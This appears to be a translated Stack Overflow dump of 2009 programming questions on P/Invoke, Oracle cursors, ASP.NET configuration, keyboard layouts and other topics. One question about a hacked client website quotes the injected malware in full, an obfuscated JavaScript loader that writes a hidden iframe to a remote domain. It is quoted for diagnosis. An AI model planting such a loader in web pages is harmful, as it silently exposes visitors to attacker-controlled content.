     self._value = value  

   value = property(_get, _set) 
```

请注意，“内部”变量必须具有与属性不同的名称（我使用`_value`）。

然后，

```
setattr(x, 'value', 99) 
```

应该管用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-27T17:03:30.850

```
getattr(x,"value=",99) 
```

返回 99，因为`x`没有属性 "value="（注意等号），所以 getattr 返回提供的默认值 (99)。

# .net - P/Invoke SHSetKnownFolderPath

> ID：484236
> 
> 赞同：1
> 
> 时间：2009-01-27T17:00:18.860
> 
> 标签：.net, pinvoke

编辑：Scotty2012 和大卫莫顿的答案对我不起作用，所以我对这个问题给予了赏金。我想我需要在传入之前将字符串的类型更改为其他类型。

我在 P/Invoke 上不是什么警察，我正在努力声明和调用[SHSetKnownFolderPath](http://msdn.microsoft.com/en-us/library/bb762249(VS.85).aspx)。我正在使用 VB9，但如果有人在 C# 中给出答案，我应该能够翻译。

我有 SHGetKnowFolderPath 工作。这是我的代码。

在 VB 中

```
Imports System.Runtime.InteropServices

Public Class Form1
    <DllImport("shell32.dll")> _
    Private Shared Function SHGetKnownFolderPath(<MarshalAs(UnmanagedType.LPStruct)> ByVal rfid As Guid, ByVal dwFlags As UInteger, ByVal hToken As IntPtr, ByRef pszPath As IntPtr) As Integer
    End Function

    <DllImport("shell32.dll")> _
    Private Shared Function SHSetKnownFolderPath(<MarshalAs(UnmanagedType.LPStruct)> ByVal rfid As Guid, ByVal dwFlags As UInteger, ByVal hToken As IntPtr, ByRef pszPath As IntPtr) As Integer
    End Function

    Public Shared ReadOnly Documents As New Guid("FDD39AD0-238F-46AF-ADB4-6C85480369C7")

    Private Sub ButtonSetDocumentsPath_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonSetDocumentsPath.Click
        Dim pPath As IntPtr = Marshal.StringToCoTaskMemUni(TextBoxPath.Text)
        If SHSetKnownFolderPath(Documents, 0, IntPtr.Zero, pPath) = 0 Then
            MsgBox("Set Sucessfully")
        End If

    End Sub

    Private Sub ButtonGetDocumentsPath_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ButtonGetDocumentsPath.Click
        Dim pPath As IntPtr
        If SHGetKnownFolderPath(Documents, 0, IntPtr.Zero, pPath) = 0 Then
            Dim s As String = Marshal.PtrToStringUni(pPath)
            Marshal.FreeCoTaskMem(pPath)
            TextBoxPath.Text = s
        End If

    End Sub
End Class 
```

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-01T21:59:02.977

试试这个代码。抱歉冗长，但正确 PInvoke 这个特定功能都需要它。它是一个简单的控制台应用程序，包括两个函数的定义和 SHGetKnownFolderPath 的示例用法。

我继续并包含了 KNOWN_FOLDER_FLAG 的定义以及文件夹 ID 的一些定义。所有文件夹 ID 实际上只是 GUID。所有可能的 ID 都可以在 %ProgramFiles%\Windows SDK\v6.0A\Include\KnownFolders.h 中找到，并以我在示例中添加的相同方式添加。

我包含了几个包装函数，它们隐藏了所有用于调用特定函数的邪恶编组细节。

如果您想要任何特定的文件夹 ID 或解释，请添加评论，我将更新示例。

**编辑**更正了 SHSetKnownFolderPath 编组中的一个错误。我没有向字符串值添加 MarshalAs 标记，它默认为 ANSI 字符串。API 需要 unicode。SHSetFolderFunction 现在可以工作了（通过 RecentFolder 确认）

```
Imports System.Runtime.InteropServices

Module NativeMethods

    Public Enum KNOWN_FOLDER_FLAG

        '''KF_FLAG_CREATE -> 0x00008000
        KF_FLAG_CREATE = 32768

        '''KF_FLAG_DONT_VERIFY -> 0x00004000
        KF_FLAG_DONT_VERIFY = 16384

        '''KF_FLAG_DONT_UNEXPAND -> 0x00002000
        KF_FLAG_DONT_UNEXPAND = 8192

        '''KF_FLAG_NO_ALIAS -> 0x00001000
        KF_FLAG_NO_ALIAS = 4096

        '''KF_FLAG_INIT -> 0x00000800
        KF_FLAG_INIT = 2048

        '''KF_FLAG_DEFAULT_PATH -> 0x00000400
        KF_FLAG_DEFAULT_PATH = 1024

        '''KF_FLAG_NOT_PARENT_RELATIVE -> 0x00000200
        KF_FLAG_NOT_PARENT_RELATIVE = 512

        '''KF_FLAG_SIMPLE_IDLIST -> 0x00000100
        KF_FLAG_SIMPLE_IDLIST = 256

        '''KF_FLAG_ALIAS_ONLY -> 0x80000000
        KF_FLAG_ALIAS_ONLY = &H80000000
    End Enum

    Public ComputerFolder As Guid = New Guid("0AC0837C-BBF8-452A-850D-79D08E667CA7")
    Public DesktopFolder As Guid = New Guid("B4BFCC3A-DB2C-424C-B029-7FE99A87C641")
    Public DocumentsFolder As Guid = New Guid("FDD39AD0-238F-46AF-ADB4-6C85480369C7")

    <DllImport("shell32.dll")> _
    Public Function SHGetKnownFolderPath( _
        ByRef folderId As Guid, _
        ByVal flags As UInteger, _
        ByVal token As IntPtr, _
        <Out()> ByRef pathPtr As IntPtr) As Integer

    End Function

    <DllImport("shell32.dll")> _
    Public Function SHSetKnownFolderPath( _
        ByRef folderId As Guid, _
        ByVal flags As UInteger, _
        ByVal token As IntPtr, _
        <[In](), MarshalAs(UnmanagedType.LPWStr)> ByVal path As String) As Integer

    End Function

    Public Function SHGetKnownFolderPathWrapper(ByVal folderId As Guid) As String
        Return SHGetKnownFolderPathWrapper(folderId, 0)
    End Function

    Public Function SHGetKnownFolderPathWrapper( _
        ByVal folderId As Guid, _
        ByVal flags As KNOWN_FOLDER_FLAG) As String

        Dim ptr = IntPtr.Zero
        Dim path = String.Empty
        Try
            Dim ret = SHGetKnownFolderPath(folderId, CUInt(flags), IntPtr.Zero, ptr)
            If ret <> 0 Then
                Throw Marshal.GetExceptionForHR(ret)
            End If
            path = Marshal.PtrToStringUni(ptr)
        Finally
            Marshal.FreeCoTaskMem(ptr)
        End Try
        Return path
    End Function

    Public Sub SHSetKnownFolderPathWrapper( _
        ByVal folderId As Guid, _
        ByVal path As String)

        SHSetKnownFolderPathWrapper(folderId, 0, path)
    End Sub

    Public Sub SHSetKnownFolderPathWrapper( _
        ByVal folderId As Guid, _
        ByVal flags As KNOWN_FOLDER_FLAG, _
        ByVal path As String)

        Dim ret = SHSetKnownFolderPath(folderId, CUInt(flags), IntPtr.Zero, path)
        If ret <> 0 Then
            Throw Marshal.GetExceptionForHR(ret)
        End If
    End Sub

End Module

Module Module1

    Sub Main()
        Dim path = SHGetKnownFolderPathWrapper(NativeMethods.DesktopFolder)
        Console.WriteLine(path)
    End Sub

End Module 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-27T17:29:33.450

我认为这应该在 C# 中工作（我没有在这里运行 vista，所以我无法检查）：

```
[DllImport("shell32.dll")]
private static int SHSetKnownFolderPath(ref Guid guid, int flags, IntPtr hToken, string newPath); 
```

你可以这样称呼它

```
SHSetKnownFolderPath(ref Documents, 0, IntPtr.Zero, "c:\\my new path\\"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-27T17:30:37.270

这将是声明：

```
[DllImport("shell32.dll")]
static extern int SHSetFolderPath(int csidl, IntPtr hToken, uint dwFlags, StringBuilder path) 
```

您需要创建一个 StringBuilder，将最大路径 260 传递给构造函数（这对于 Vista/XP 来说是正确的。）这是一个字符串构建器，它将为您尝试设置的文件夹提供新目录，所以将您的文本附加到新位置的 StringBuilder 中。但是，您的实现最大的问题是 csidl 参数与 Windows 中指定的 Guid 不同。这些值实际上是在[shlobj.h](http://source.winehq.org/source/include/shlobj.h#L1283)中声明的值。按照链接查看最上面要传入的值。hToken 应始终为 IntPtr.Zero，除非您有一个指向您尝试更改它的特定用户的指针。IntPtr.Zero 将使用当前用户。dwFlags 应始终设置为 0。

# asp.net - 无法从 web.config 引用自定义事件

> ID：484237
> 
> 赞同：4
> 
> 时间：2009-01-27T17:00:57.983
> 
> 标签：asp.net, web-config

我编写了一个从位于我的 ASP.NET 2.0 网站项目的 App_Code 文件夹中`MyWebErrorEvent`派生的自定义事件。`WebErrorEvent`该类`MyWebErrorEvent`不包含在命名空间中。我已将以下内容放入我的 web.config 文件中：

```
<configuration>
  <system.web>
    <healthMonitoring>
      <eventMappings>
        <add name="Event1" startEventCode="0" endEventCode="2147483647" type="MyWebErrorEvent"/>
      </eventMappings>
    </healthMonitoring>
  </system.web>
</configuration> 
```

在编译时和运行时，我收到以下错误：

```
Description: An error occurred during the processing of a configuration file required to service this request. Please review the specific error details below and modify your configuration file appropriately.

Parser Error Message: Could not load type 'MyWebErrorEvent'.

Source Error: 

Line 16: <healthMonitoring>
Line 17: <eventMappings>
Line 18: <add name="Event1" startEventCode="0" endEventCode="2147483647" type="MyWebErrorEvent"/>
Line 19: </eventMappings>
Line 20: </healthMonitoring> 
```

MyWebErrorEvent 类确实编译没有错误。有人知道怎么修这个东西吗？

**编辑：** [http://msdn.microsoft.com/en-us/library/bb398933.aspx](http://msdn.microsoft.com/en-us/library/bb398933.aspx)说这应该适用于自定义事件。一个报价：

> 将包含自定义 Web 事件实现的程序集添加到 ASP.NET 应用程序的 Bin 子目录。或者，您可以将事件源代码文件添加到 App_Code 子目录。

但是它也表示这不适用于自定义事件提供程序：

> 将包含自定义提供程序实现的程序集放在应用程序的 Bin 子目录中。您不能将提供程序源代码文件放在 App_Code 子目录中，因为在编译 App_Code 子目录中的任何代码文件之前，已配置和创建了健康监测系统。

我猜文档实际上关于自定义事件是不正确的，它们必须进入一个与网站不同的组件。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-28T06:04:24.237

（这里只是猜测......）

对于网站，App_Code 中的类直到运行时才被编译。您的 Web.config 在 MyWebErrorEvent 有机会被动态编译之前被编译。最好的办法是独立于网站创建一个类库，并从您的网站引用该项目。另一种选择是转换为使用 Web 应用程序，它实际上在编译时将所有类型编译到一个 DLL 中，而不是在运行时动态发出它们。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2011-05-12T09:03:56.057

无需将其放在单独的 DLL 中。而是使用

`type="MyWebErrorEvent,App_Code"`引用 MyWebErrorEvent 类。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-28T05:50:45.170

您的 MyWebErrorEvent 类型是否使用命名空间？

错误消息看起来像是典型的缺少命名空间问题。

# c++ - 如何在 C++ 中定义友元函数和运算符重载

> ID：484241
> 
> 赞同：0
> 
> 时间：2009-01-27T17:01:27.797
> 
> 标签：c++, programming-languages, operator-overloading

我想了解 C++ 中的友元函数和运算符重载以及它们是如何工作的？与程序？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-01-27T17:11:19.977

我喜欢这个指南。这很好。

[C++中的朋友](http://www.parashift.com/c++-faq-lite/friends.html)

[C++ 中的运算符重载](http://www.parashift.com/c++-faq-lite/operator-overloading.html)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-27T17:13:11.860

这是一篇关于 C++ 中运算符重载的好[文章](http://www.devarticles.com/c/a/Cplusplus/Operator-Overloading-in-C-plus/)。

# sql - 将不同的（多个）游标传递给同一个 For 循环

> ID：484242
> 
> 赞同：2
> 
> 时间：2009-01-27T17:02:05.847
> 
> 标签：sql, oracle, oracle10g

编辑以获得更好的说明：

* * *

2009 年 1 月 28 日补充：为了便于解释，我过度简化了代码，但是 select 语句很长很复杂，第二个依赖于第一个游标完成并循环后的第一个含义，并且插入创建第二个选择实际上将第一个插入视为 where 子句的一部分。

这就是为什么我需要多次使用循环而不以任何方式组合选择的原因。当我按照我想要调用它们的顺序调用它们时，我需要它们运行，这让我回到了我原来的问题，是否仍然可以重新使用具有不同光标的循环？

再次感谢。

* * *

我正在创建一个包（Oracle 10），其中有 4 个不同的选择语句（可能还会有更多），我为所有这些语句创建了一个游标并获取我的数据。现在通常我获取数据并创建一个 For 循环，一切都很好。

我的问题是我有 4 个不同的选择，但我想重新使用循环，以便我可以让光标 c2 使用相同的循环以及 c3 和 c4。所有这些都是游标从非常不同的选择中获取不同的信息，但它们都进入同一个表，我的插入语句在循环中。我也不能将所有选择连接在一起，它们必须在每个循环后按顺序完成

我在下面创建了一个带有 4 个循环的示例，但正如您所见，它们都是相同的，唯一的区别是： For r in c1 loop， For r in c2 loop ...我认为必须有某种方式可以重用循环。我有一些想法，但都没有奏效。

```
 cursor c1 is  select info_a, info_b from table_x where info_g = 77; 
 cursor c2 is  select info-a, info_b from table_x where info_g = 88;
 cursor c3 is  select info-a, info_b from table_y where info_j = 88;
 cursor c4 is  select info-a, info_b from table_y where info_j = 99;

  Begin

     For r in c1 loop
        insert into fun_table (good_info, boring_info) values (r.info_a, r.info-b);
     end loop;
    commit;

     For r in c2 loop
        insert into fun_table (good_info, boring_info) values (r.info_a, r.info-b);
     end loop;
    commit;

     For r in c3 loop
        insert into fun_table (good_info, boring_info) values (r.info_a, r.info-b);
     end loop;
    commit;

     For r in c4 loop
        insert into fun_table (good_info, boring_info) values (r.info_a, r.info-b);
     end loop;
    commit;

   end; 
```

希望这更有意义，谢谢

我进行了编辑，然后出现了一些答案……对不起。原来的样子是这样的：

```
 cursor c1 is  select some_info, other_info from some_table where where some_thing = 'xyz'; 
cursor c2 is select some_info, other_info from some_table where where some_thing = 'abc';

   For r in c1 loop
        insert into fun_table (good_info, boring_info) values (r.some_info, r.other_info);
    end loop; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-30T18:34:04.047

如果有人需要知道如何做到这一点，这是一个有效的答案。正如我办公室里另一个做过一些研究的人给我的：

我创建了一个包含 2 个程序的包第一个是多个游标，第二个是循环（我过度简化了选择和插入以显示它是如何完成的）

第一个过程称为 Select_Cursor ：

```
procedure Select_Cursors is 

  the_cursor sys_refcursor;    -- this defines the_cursor as type sys_refcursor  

begin

 open the_cursor for 

     select  application_idn, account_idn     
      from accounts ac,  applications ha
     where  something = somethingelse

 Insert_Cursor ( the_cursor );  
 close the_cursor;

  open the_cursor for 

     select  application_idn, account_idn     
      from accounts ac,  applications ha
     where  somethingfunny = somethingcrazy

  Insert_Cursor ( the_cursor );  
 close the_cursor;

 ...  repeat for every select

 end Select_Cursors; 
```

第二个称为 Insert_Cursor 的过程是：

```
procedure Insert_Cursor ( p_cursor in sys_refcursor ) is

    begin

       loop
            fetch p_cursor into  application_idn, account_idn ;
            exit when p_cursor%notfound;

            insert into payments (issue_type_des, issued_amt, payment_Type_cde,payment_Status_Cde, created_by, application_idn, account_idn)
                 values          (v_paytype, v_amount, 'S','PE','This Process',  application_idn, account_idn);
       end loop;

       commit;

    end Insert_Cursor; 
```

再次感谢所有给出答案并调查问题的人，不胜感激

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-27T20:12:58.893

或者只是这样做：

```
cursor c1 is  
select info_a, info_b from table_x where info_g IN (77, 88) UNION ALL
select info-a, info_b from table_y where info_j IN (88, 99);

Begin

     For r in c1 loop
        insert into fun_table (good_info, boring_info) values (r.info_a, r.info-b);
     end loop;
    commit;

END; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-27T19:54:33.547

因此，您将拥有以下选择语句：

```
select some_info, other_info from some_table where some_thing = 'xyz'; 
select c2_info, c2_other from c2_table where c2_thing = 'XYZ;' 
```

您可以通过将 c1 声明为其他未知类型的 SYS_REFCURSOR 来做到这一点，并确保每个查询的所有列都属于相同类型（或接近它）。您不能使用行类型，您必须单独声明列，并且是适用于所有查询的通用类型。但以下确实有效。

```
DECLARE
  C1 SYS_REFCURSOR;
  TableID NUMBER;
  TableName VARCHAR2(240);
BEGIN

  OPEN C1 FOR select CALENDAR_ID, CALENDAR_NAME from CALENDARS;

  LOOP
    FETCH C1 INTO tableid, tablename;
    EXIT WHEN C1%NOTFOUND;
    DBMS_OUTPUT.put_line ('ID: ' || to_char(tableID) || ' -- NAME: ' || TableName);
  END LOOP;
  CLOSE C1;
  OPEN C1 for SELECT INIT_ID, NAME FROM INITS;  
  LOOP
    FETCH C1 INTO tableid, tablename;
    EXIT WHEN C1%NOTFOUND;
    DBMS_OUTPUT.put_line ('ID: ' || to_char(tableID) || ' -- NAME: ' || TableName);
  END LOOP;
  CLOSE C1;
END; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-27T20:06:31.323

做就是了：

```
begin
  insert into cool_table 
  ( neat_info 
  , boring_info)
  select some_info
  ,      other_info 
  from some_table 
  where some_thing = 'XYZ';
end; 
```

不需要游标循环。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-27T20:18:08.727

为什么不动态构建游标查询并且只使用一个游标？

我假设 77、88 和 99 来自存储过程的参数。

```
cursor c1 is  
select info_a, info_b from table_x where info_g in( 77, 88)
UNION
select info-a, info_b from table_y where info_j in (88, 99)
... 
```

# nant - Nant 构建时间集

> ID：484244
> 
> 赞同：1
> 
> 时间：2009-01-27T17:02:53.643
> 
> 标签：nant

有人知道如何在 NANT 项目脚本上设置构建时间吗？实际上，我希望 NANT 在某个特定时间运行该项目，例如每晚 8 点（每晚构建）。我该如何设置这个时间？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-27T17:07:56.737

在控制面板下设置 nant 命令作为计划任务*运行。

*如果您使用的是 Mono，则为 cron 作业。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2010-02-17T14:25:26.993

将此添加到您的 ccnet.config 文件中，让 CruiseControl .net 在给定的 day.time 运行您的构建项目：

```
<scheduleTrigger time="23:30" buildCondition="ForceBuild">
     <weekDays>
        <weekDay>Monday</weekDay>
        <weekDay>Tuesday</weekDay>
        <weekDay>Wednesday</weekDay>
        <weekDay>Thursday</weekDay>
        <weekDay>Friday</weekDay>
        <weekDay>Saturday</weekDay>
    </weekDays>
</scheduleTrigger> 
```

正如代码所示，这将强制构建事件在每天 23:30 之后的周一至周六进行。

有什么好处吗？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-02-09T09:56:03.703

你不能用 nant 做到这一点。创建简单批处理脚本的简单方法（它将触发您的 nant 脚本）并在您想要的时间从 Windows 任务计划程序运行它

# visual-studio-2008 - Visual Studio 似乎随机采用美式键盘布局

> ID：484248
> 
> 赞同：123
> 
> 时间：2009-01-27T17:03:40.007
> 
> 标签：visual-studio-2008, regional

呸！这真的让我今天很麻烦。突然没有警告'@'（符号）和'"'（双引号）是我键盘上的交易位置，但仅在 Visual Studio 2008 中！

我似乎无法在帮助或网上找到任何解释/补救措施。是否有一些我无意中执行的键盘快捷键？

我重新启动了我的电脑，它消失了一两个小时，然后突然回来了。

哦，精神错乱:(

* * *

## 回答 #1

> 赞同：230
> 
> 时间：2009-01-27T17:07:55.320

我尝试过同样的事情，但结果证明是因为我在某些程序中按了 Alt+Shift，从而触发了 Windows 中的语言切换。

会不会是你在编码时不小心按了 Alt+Shift 或 Ctrl+Shift（英式布局）？

* * *

## 回答 #2

> 赞同：87
> 
> 时间：2009-01-27T17:09:18.403

这是 Windows 本身更改键盘布局 - 这与 Visual Studio 没有任何关系，但在您使用 Visual Studio 时会发生这种情况，因为您在输入代码时使用的组合键类似于 Windows XP 用于的默认组合键即时切换键盘布局。

这些说明用于在 Windows XP 中禁用键盘布局切换。在其他版本的 Windows 中也是如此：-

*   进入控制面板并选择区域和语言选项。
*   然后在语言选项卡上点击详细信息按钮。
*   在弹出的对话框中，在设置选项卡上，点击底部的键盘按钮。
*   在弹出的“高级按键设置”框中，一一选择其他语言，取消勾选按键顺序选项。
*   好吧，一切都结束了，你就没有挫折感了 :)

* * *

## 回答 #3

> 赞同：29
> 
> 时间：2010-10-12T09:09:11.653

U62-如果不是他们的答案，也许人们不会将您的解决方案标记为答案？

对我来说，这不是 CTRL+SHIFT 或任何其他键绑定问题。

我什至没有安装美国国际键盘，但 Visual Studio 不断恢复到它（我可以在语言栏中看到它，但是当我进入控制面板时，它不在已安装的键盘列表中）。

Visual Studio 肯定有问题，因为如果我再转到记事本，记事本就知道键盘是英国的。再次回到VS2010，它又回到了美国国际。

编辑：答案是进入 Visual Studio 设置，然后选择国际设置窗格。确保语言设置为“与 Microsoft Windows 相同”。“英语”似乎是美国国际键盘英语。

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2013-05-30T12:21:56.310

我在[另一个问题](https://stackoverflow.com/questions/7261916/enter-backspace-and-the-navigation-keys-not-responding-in-visual-studio-2010-w/16835925#16835925)上发布了这个，但想在这里发布图片以防您不使用 XP，并想看看如何在 Windows 7 中完成此操作：

![在此处输入图像描述](https://i.stack.imgur.com/IJXSs.png)

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2012-04-25T09:34:00.887

我知道这已经很晚了，但实际上没有人说你是如何禁用它的。

在 Windows 7 中，转到区域设置 -> 键盘和布局 -> 更改键盘 -> 高级键设置 -> 输入语言的热键。

选择“输入语言之间”并将键序列更改为“未分配”

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2017-02-03T13:57:41.577

## Windows 7的

从以下位置删除除一个键盘外的所有键盘：

`Control Panel`>> `Region And Language`>> `Keyboards and Languages`>>`Change Keyboards`

[![在此处输入图像描述](https://i.stack.imgur.com/FA1QC.png)](https://i.stack.imgur.com/FA1QC.png)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-09-17T19:15:01.487

我在 Visual Studio 2010 Beta 1 中遇到了同样的问题。

但是，我了解到按 CTRL + SHIFT 可以在 Qwerty 和 Dvorak 之间切换键盘。

当我保存所有（CTRL + SHIFT + S）并在点击“S”之前意外释放时，这非常痛苦，直到我弄清楚导致问题的原因。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2010-03-02T09:54:50.257

实际上我可以按照这些步骤重现这个。我怀疑这可能与编译应用程序的语言文化有关。我在语言栏上有英式和美式键盘。

我已经构建了一个简单的 C# Windows 窗体应用程序。我将键盘设置设置为美国。我有一个美式键盘，尽管机器上的其他区域设置都是英国的（我拥有的 Micosoft 键盘的美国版比英国版少一个键，它是一个反斜杠，grr。）当我启动应用程序时调试器的键盘设置奇迹般地变回了英国设置。每次都会发生这种情况，因此不是正在按下另一个键。我还应该提到这发生在 Windows Vista 中。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-01-27T17:24:14.833

在 XP 中，如果安装了超过 1 种键盘输入语言（例如：Dvorak 和 Qwerty），XP 将随机翻转，尤其是返回到操作系统的默认语言，并且大多数情况下仅在使用 Microsoft 应用程序时才会发生。而且我 100% 确定我没有按 Alt+Shift 或任何其他组合键。无论您使用何种键盘映射或语言，同样的问题都可能会困扰您。

唯一的解决方法是删除辅助语言，仅在需要时添加。另一个解决方案是使用 Vista，我注意到它不再受此错误的影响（自从我在 2003 年开始使用 Dvorak 以来一直存在，甚至 XP SP3 也没有修复它）。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2020-05-02T07:43:29.373

要在 VSC 中改回您想要的语言：
1- 您必须按 Ctrl+Alt+P，或 Ctrl + Shift + P
尝试在那里写“显示语言”，它应该使用“配置显示语言”选项自动完成
2- 然后在将出现在顶部的显示中，写下您想要的语言以防它不出现，
3- 一旦完成，VSC 将要求您重新启动。
4-一旦重启完成它应该没问题。

它一直为我解决问题

# mysql - ssis 变量语法与 mysql 输出变量冲突

> ID：484257
> 
> 赞同：0
> 
> 时间：2009-01-27T17:06:35.273
> 
> 标签：mysql, stored-procedures, ssis

我创建了一个 SSIS 包，它需要使用输出参数执行 MySQL SPROC。

MySQL SPROC 在查询浏览器中运行良好。

问题是 @ 字符用于标记 SSIS 变量，也用作 MySQL sproc 变量以进行输出。该步骤在 SSIS 中不起作用。

有谁知道修复？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-01-27T18:13:17.853

我想出了一个解决方案：

我创建了一个生成变量查询的步骤。

我将变量查询作为变量输入而不是直接输入来执行。

# javascript - 客户的网站被攻击了，eeek！

> ID：484261
> 
> 赞同：13
> 
> 时间：2009-01-27T17:07:34.180
> 
> 标签：javascript, security

好吧，我想这一天必须到来。

我客户的网站已被 Google 入侵并列入黑名单。当您加载主页时，此 javascript 会自动添加到文档底部：

```
<script type="text/javascript">var str='google-analytics.com';var str2='6b756c6b61726e696f6f37312e636f6d';str4='php';var str3='if';str='';for(var i=0;i<str2.length;i=i+2){str=str+'%'+str2.substr(i,2);}str=unescape(str);document.write('<'+str3+'rame width=1 height=1 src="http://'+str+'/index.'+str4+'?id=382" style="visibility: hidden;"></'+str3+'rame>');</script></head><body><iframe src="http://kulkarnioo71.com/index.php?id=382" style="visibility: hidden;" width="1" height="1"></iframe> 
```

我还没有剖析它，但很明显，它是一个试图冒充谷歌分析的攻击者。我无法理解的是，如果我从主页中删除 HTML 的每一位最后一点，以至于 index.html 是一个空文档，javascript 仍然会被嵌入。是什么赋予了？这怎么可能？

**更新**

*   该网站是一个非常简单的日历应用程序，在每月 10 美元的 godaddy unix 帐户、MySQL、PHP 上运行。

*   这不是我的计算机特有的本地问题，因为我的客户是那个给我打电话的人。也发生在我家里的所有电脑上 (4)

我会去网络服务器上运行扫描...

**来源已确定**

好吧，我发现了 javascript 的来源。我愚蠢地只清空了`template.html`文件，但仍然通过我的 php 模板系统运行脚本。显然，上面的代码不知何故附加到了我的`index.php`和`main.php`文件的底部。这怎么可能？

多一点背景：

*   如上所述，它是一个日历应用程序，仅由我客户的小公司使用。做任何事情都需要登录，而且只有 5 人左右的人有帐户。我可以保证他们都不会尝试任何恶作剧。不过，我显然不能保证有人掌握了他们的信息并尝试了恶作剧。
*   可悲的是，我确实在 4 年前创建了这个网站，所以我并不是 100% 有信心保护我免受孩子们现在尝试的一切，但我仍然无法理解攻击者如何可能获得访问网络服务器的权限来附加这个 javascript到我的 php 文件。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-01-27T17:11:49.570

您是否从 SQL 数据库提供任何内容？妥协可能是 SQL 注入攻击，并且您在数据库中的站点内容已被此脚本/标记替换/修改。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-01-27T17:11:35.110

一个流氓 HTTP 模块（在 IIS 中），或者 apache 的任何等效模块可以为任何 HTTP 请求添加、附加甚至修改内容，甚至是静态文件。这表明服务器本身已受到威胁。

编辑：如果您让我们知道您正在使用哪种类型的网络服务器，我们将能够为故障排除提出更具体的建议。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-04-26T07:56:52.550

它与.htaccess有关吗？

```
php_value auto_append_file /server/path/to/my/www_root/subdir/file.ext" 
```

可以自动将文件附加到文档的底部。尽管如果您无法使用该 JS 识别文件，那么我想这不太可能。你有没有想过他们是怎么做到的？

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-27T17:17:51.180

您是否允许来自用户的任何 html 输入？也许是没有正确过滤的东西。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-04-26T08:42:29.463

我建议您查看您的日志文件。通过网络进行的每次访问都应记录在此处。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-27T17:11:56.853

您确定该漏洞不是您机器上的本地漏洞，并且本地某些东西正在将 HTML 注入您的网络浏览器，然后导致您的浏览器执行 JS？

[使用Spybot](http://www.safer-networking.org/en/download/)运行可靠的本地扫描，最好使用[NOD32](http://www.eset.com/download/trial_software.php?product=EAV)。如果您不想安装 NOD32，因为它可能与您当前的 AV 冲突，您可以使用[Stinger](http://vil.nai.com/VIL/stinger/)，它是一个作为程序运行的 AV 扫描仪，不会干扰或需要重新启动。

还要在 Web 服务器上运行扫描。我还看到人们在其他论坛（例如[这里](http://www.codingforums.com/showthread.php?t=156286)）上发布了有关此内容的信息。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2010-01-05T10:36:42.253

大约一年前，我们的一位客户遇到了类似的问题。

事实证明，客户端使用的是 FTP 客户端，该客户端以纯文本形式保存其密码，并且系统感染了病毒，该病毒专门扫描系统以查找这些密码文件，以覆盖文件中保存的主机源代码。

有关更多信息，还请查看[http://blog.unmaskparasites.com/2009/12/23/from-hidden-iframes-to-obfuscated-scripts/](http://blog.unmaskparasites.com/2009/12/23/from-hidden-iframes-to-obfuscated-scripts/)。您会发现它与您遇到的问题非常相似。

我们的解决方案是鼓励我们的客户不要保存密码，或使用对密码进行强加密的 FTP 客户端。

# .net - 在 Visual Studio 中使用 2 个项目和 2 个测试项目时如何避免重复设置？

> ID：484266
> 
> 赞同：0
> 
> 时间：2009-01-27T17:09:03.007
> 
> 标签：.net, visual-studio, visual-studio-2008, unit-testing, app-config

按照我[之前的问题](https://stackoverflow.com/questions/484087/how-to-avoid-duplicate-app-config-using-visual-studio-2008-unit-testing)，现在我有 2 个项目：一个控制台项目和一个库项目。他们也有各自的单元测试项目。当我为使用库项目中的方法的控制台项目运行测试并且库项目需要 app.config 设置时，该设置必须在控制台测试项目的 app.config 中。我必须做些什么才能让它从库项目 app.config 中读取设置，所以我不必在多个 app.config 中复制设置？

**更新**我不想为两个项目使用相同的 App.Config。我现在必须做但不想再做的是将所有库 app.config 设置复制到控制台项目设置中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-27T19:19:01.093

我使用的一种选择是通过软链接共享配置文件。首先在一个项目中创建 app.config 文件，然后将其添加到另一个项目中：

1.  右键单击另一个项目。
2.  选择 Add -> Existing Item 并导航到 thh app.config。
3.  不要点击添加！单击按钮右侧的小箭头，然后选择添加为链接。

这当然假设您可以对两个项目使用相同的文件。

更新：我不知道您需要共享 app.config 的哪一部分。但是对于 appSettings 部分，您可以通过“文件”属性包含另一个文件的内容。

<appSettings file="commonSetting.config">

</app设置>

也许在您的情况下可以使用类似的东西？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-27T20:02:34.063

如果库项目是类库，那么它需要一个上下文来执行。VS不会读取类库的app.config文件，它只会从执行上下文中读取app.config文件，据我所知. 该设置必须在控制台 app.config 中，因为这是执行的上下文。如果您正在运行单元测试并且它们是执行上下文，那么它们也将需要自己的 app.config。

# .net - Visual Studio 2010 - WPF / Silverlight 和内置网格

> ID：484268
> 
> 赞同：3
> 
